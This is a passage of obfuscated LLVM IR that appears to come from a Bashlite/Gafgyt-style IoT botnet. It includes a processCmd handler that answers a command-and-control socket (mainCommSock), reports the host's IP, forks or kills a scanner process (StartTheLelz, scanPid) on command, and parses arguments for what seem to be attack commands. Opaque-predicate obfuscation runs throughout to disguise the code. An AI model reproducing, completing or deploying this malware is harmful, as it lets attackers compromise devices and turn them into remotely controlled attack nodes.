  %221 = load i32, i32* %220, align 8
  %222 = bitcast i32* %14 to i8*
  %223 = call i32 @getsockopt(i32 %221, i32 1, i32 4, i8* %222, i32* %13) #2
  %224 = load i32, i32* %14, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %253

; <label>:226:                                    ; preds = %216
  %227 = load i32, i32* @x.71
  %228 = load i32, i32* @y.72
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %226
  %235 = load i32, i32* %8, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %236
  %238 = getelementptr inbounds %struct.state_t, %struct.state_t* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 8
  %240 = call i32 @close(i32 %239)
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 1
  store i8 0, i8* %244, align 4
  %245 = load i32, i32* @x.71
  %246 = load i32, i32* @y.72
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %258

; <label>:253:                                    ; preds = %216
  %254 = load i32, i32* %8, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %255
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %256, i32 0, i32 1
  store i8 2, i8* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %253, %originalBBpart216
  br label %290

; <label>:259:                                    ; preds = %185
  %260 = load i32, i32* %15, align 4
  %261 = icmp eq i32 %260, -1
  br i1 %261, label %262, label %273

; <label>:262:                                    ; preds = %259
  %263 = load i32, i32* %8, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %264
  %266 = getelementptr inbounds %struct.state_t, %struct.state_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 8
  %268 = call i32 @close(i32 %267)
  %269 = load i32, i32* %8, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %270
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %271, i32 0, i32 1
  store i8 0, i8* %272, align 4
  br label %273

; <label>:273:                                    ; preds = %262, %259
  %274 = load i32, i32* @x.71
  %275 = load i32, i32* @y.72
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %273
  %282 = load i32, i32* @x.71
  %283 = load i32, i32* @y.72
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %290

; <label>:290:                                    ; preds = %originalBBpart220, %258
  br label %377

; <label>:291:                                    ; preds = %originalBBpart24
  %292 = load i32, i32* @x.71
  %293 = load i32, i32* @y.72
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %291
  %300 = load i32, i32* @x.71
  %301 = load i32, i32* @y.72
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %308

; <label>:308:                                    ; preds = %originalBBpart224
  %309 = load i32, i32* @x.71
  %310 = load i32, i32* @y.72
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %308
  %317 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %318 = getelementptr inbounds [16 x i64], [16 x i64]* %317, i64 0, i64 0
  %319 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %318) #2, !srcloc !8
  %320 = extractvalue { i64, i64* } %319, 0
  %321 = extractvalue { i64, i64* } %319, 1
  %322 = trunc i64 %320 to i32
  store i32 %322, i32* %20, align 4
  %323 = ptrtoint i64* %321 to i64
  %324 = trunc i64 %323 to i32
  store i32 %324, i32* %21, align 4
  %325 = load i32, i32* @x.71
  %326 = load i32, i32* @y.72
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %333

; <label>:333:                                    ; preds = %originalBBpart228
  br label %334

; <label>:334:                                    ; preds = %333
  %335 = load i32, i32* %8, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %336
  %338 = getelementptr inbounds %struct.state_t, %struct.state_t* %337, i32 0, i32 0
  %339 = load i32, i32* %338, align 8
  %340 = srem i32 %339, 64
  %341 = zext i32 %340 to i64
  %342 = shl i64 1, %341
  %343 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %344 = load i32, i32* %8, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %345
  %347 = getelementptr inbounds %struct.state_t, %struct.state_t* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 8
  %349 = sdiv i32 %348, 64
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [16 x i64], [16 x i64]* %343, i64 0, i64 %350
  %352 = load i64, i64* %351, align 8
  %353 = or i64 %352, %342
  store i64 %353, i64* %351, align 8
  %354 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %354, align 8
  %355 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %355, align 8
  %356 = load i32, i32* %8, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %357
  %359 = getelementptr inbounds %struct.state_t, %struct.state_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 8
  %361 = add nsw i32 %360, 1
  %362 = call i32 @select(i32 %361, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %362, i32* %15, align 4
  %363 = load i32, i32* %15, align 4
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %376

; <label>:365:                                    ; preds = %334
  %366 = load i32, i32* %8, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %367
  %369 = getelementptr inbounds %struct.state_t, %struct.state_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 8
  %371 = call i32 @close(i32 %370)
  %372 = load i32, i32* %8, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %373
  %375 = getelementptr inbounds %struct.state_t, %struct.state_t* %374, i32 0, i32 1
  store i8 0, i8* %375, align 4
  br label %376

; <label>:376:                                    ; preds = %365, %334
  br label %377

; <label>:377:                                    ; preds = %376, %290, %originalBBpart28, %originalBBpart24
  %378 = load i32, i32* @x.71
  %379 = load i32, i32* @y.72
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %377
  %386 = load i32, i32* @x.71
  %387 = load i32, i32* @y.72
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %394

; <label>:394:                                    ; preds = %originalBBpart232
  %395 = load i32, i32* %8, align 4
  %396 = add nsw i32 %395, 1
  store i32 %396, i32* %8, align 4
  br label %71

; <label>:397:                                    ; preds = %71
  br label %50

; <label>:398:                                    ; preds = %originalBBpart2
  %399 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %399)
  br label %400

; <label>:400:                                    ; preds = %398, %33
  %401 = load i32, i32* @x.71
  %402 = load i32, i32* @y.72
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %400
  %409 = load i32, i32* @x.71
  %410 = load i32, i32* @y.72
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %50
  %417 = load i32, i32* %17, align 4
  %418 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %419 = icmp sgt i32 %417, %418
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %420 = load i32, i32* %8, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %421
  %423 = getelementptr inbounds %struct.state_t, %struct.state_t* %422, i32 0, i32 1
  %424 = load i8, i8* %423, align 4
  %425 = zext i8 %424 to i32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %141
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %159
  %426 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %427 = getelementptr inbounds [16 x i64], [16 x i64]* %426, i64 0, i64 0
  %428 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %427) #2, !srcloc !7
  %429 = extractvalue { i64, i64* } %428, 0
  %430 = extractvalue { i64, i64* } %428, 1
  %431 = trunc i64 %429 to i32
  store i32 %431, i32* %18, align 4
  %432 = ptrtoint i64* %430 to i64
  %433 = trunc i64 %432 to i32
  store i32 %433, i32* %19, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %226
  %434 = load i32, i32* %8, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %435
  %437 = getelementptr inbounds %struct.state_t, %struct.state_t* %436, i32 0, i32 0
  %438 = load i32, i32* %437, align 8
  %439 = call i32 @close(i32 %438)
  %440 = load i32, i32* %8, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %441
  %443 = getelementptr inbounds %struct.state_t, %struct.state_t* %442, i32 0, i32 1
  store i8 0, i8* %443, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %273
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %291
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %308
  %444 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %445 = getelementptr inbounds [16 x i64], [16 x i64]* %444, i64 0, i64 0
  %446 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %445) #2, !srcloc !8
  %447 = extractvalue { i64, i64* } %446, 0
  %448 = extractvalue { i64, i64* } %446, 1
  %449 = trunc i64 %447 to i32
  store i32 %449, i32* %20, align 4
  %450 = ptrtoint i64* %448 to i64
  %451 = trunc i64 %450 to i32
  store i32 %451, i32* %21, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %377
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %400
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %56, label %37

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @x.73
  %39 = load i32, i32* @y.74
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0))
  %48 = load i32, i32* @x.73
  %49 = load i32, i32* @y.74
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1178

; <label>:56:                                     ; preds = %2
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %83, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* @x.73
  %64 = load i32, i32* @y.74
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %73 = call i8* @inet_ntoa(i32 %72) #2
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* %73)
  %75 = load i32, i32* @x.73
  %76 = load i32, i32* @y.74
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %1178

; <label>:83:                                     ; preds = %56
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 0
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.46, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %261, label %89

; <label>:89:                                     ; preds = %83
  %90 = load i32, i32* %3, align 4
  %91 = icmp ne i32 %90, 2
  br i1 %91, label %92, label %111

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* @x.73
  %94 = load i32, i32* @y.74
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %92
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 (i32, i8*, ...) @sockprintf(i32 %101, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.47, i32 0, i32 0))
  %103 = load i32, i32* @x.73
  %104 = load i32, i32* @y.74
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1178

; <label>:111:                                    ; preds = %89
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 1
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @strcmp(i8* %114, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %173, label %117

; <label>:117:                                    ; preds = %111
  %118 = load i32, i32* @x.73
  %119 = load i32, i32* @y.74
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %117
  %126 = load i32, i32* @scanPid, align 4
  %127 = icmp eq i32 %126, 0
  %128 = load i32, i32* @x.73
  %129 = load i32, i32* @y.74
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %127, label %136, label %153

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = load i32, i32* @x.73
  %138 = load i32, i32* @y.74
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %145 = load i32, i32* @x.73
  %146 = load i32, i32* @y.74
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1178

; <label>:153:                                    ; preds = %originalBBpart212
  %154 = load i32, i32* @x.73
  %155 = load i32, i32* @y.74
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %153
  %162 = load i32, i32* @scanPid, align 4
  %163 = call i32 @kill(i32 %162, i32 9) #2
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  %165 = load i32, i32* @x.73
  %166 = load i32, i32* @y.74
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %173

; <label>:173:                                    ; preds = %originalBBpart220, %111
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 1
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @strcmp(i8* %176, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0)) #10
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %260, label %179

; <label>:179:                                    ; preds = %173
  %180 = load i32, i32* @x.73
  %181 = load i32, i32* @y.74
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %179
  %188 = load i32, i32* @scanPid, align 4
  %189 = icmp ne i32 %188, 0
  %190 = load i32, i32* @x.73
  %191 = load i32, i32* @y.74
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %189, label %198, label %215

; <label>:198:                                    ; preds = %originalBBpart224
  %199 = load i32, i32* @x.73
  %200 = load i32, i32* @y.74
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %198
  %207 = load i32, i32* @x.73
  %208 = load i32, i32* @y.74
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1178

; <label>:215:                                    ; preds = %originalBBpart224
  %216 = call i32 @fork() #2
  store i32 %216, i32* %6, align 4
  %217 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.51, i32 0, i32 0))
  %218 = load i32, i32* %6, align 4
  %219 = icmp ugt i32 %218, 0
  br i1 %219, label %220, label %238

; <label>:220:                                    ; preds = %215
  %221 = load i32, i32* @x.73
  %222 = load i32, i32* @y.74
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %220
  %229 = load i32, i32* %6, align 4
  store i32 %229, i32* @scanPid, align 4
  %230 = load i32, i32* @x.73
  %231 = load i32, i32* @y.74
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %1178

; <label>:238:                                    ; preds = %215
  %239 = load i32, i32* %6, align 4
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %241, label %258

; <label>:241:                                    ; preds = %238
  %242 = load i32, i32* @x.73
  %243 = load i32, i32* @y.74
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %241
  %250 = load i32, i32* @x.73
  %251 = load i32, i32* @y.74
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %1178

; <label>:258:                                    ; preds = %238
  br label %259

; <label>:259:                                    ; preds = %258
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:260:                                    ; preds = %173
  br label %261

; <label>:261:                                    ; preds = %260, %83
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 0
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @strcmp(i8* %264, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0)) #10
  %266 = icmp ne i32 %265, 0
  br i1 %266, label %371, label %267

; <label>:267:                                    ; preds = %261
  %268 = load i32, i32* %3, align 4
  %269 = icmp slt i32 %268, 4
  br i1 %269, label %298, label %270

; <label>:270:                                    ; preds = %267
  %271 = load i32, i32* @x.73
  %272 = load i32, i32* @y.74
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %270
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 2
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @atoi(i8* %281) #10
  %283 = icmp slt i32 %282, 1
  %284 = load i32, i32* @x.73
  %285 = load i32, i32* @y.74
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %283, label %298, label %292

; <label>:292:                                    ; preds = %originalBBpart240
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 3
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  %297 = icmp slt i32 %296, 1
  br i1 %297, label %298, label %299

; <label>:298:                                    ; preds = %292, %originalBBpart240, %267
  br label %1178

; <label>:299:                                    ; preds = %292
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 1
  %302 = load i8*, i8** %301, align 8
  store i8* %302, i8** %7, align 8
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 2
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #10
  store i32 %306, i32* %8, align 4
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 3
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #10
  store i32 %310, i32* %9, align 4
  %311 = load i8*, i8** %7, align 8
  %312 = call i8* @strstr(i8* %311, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %313 = icmp ne i8* %312, null
  br i1 %313, label %314, label %362

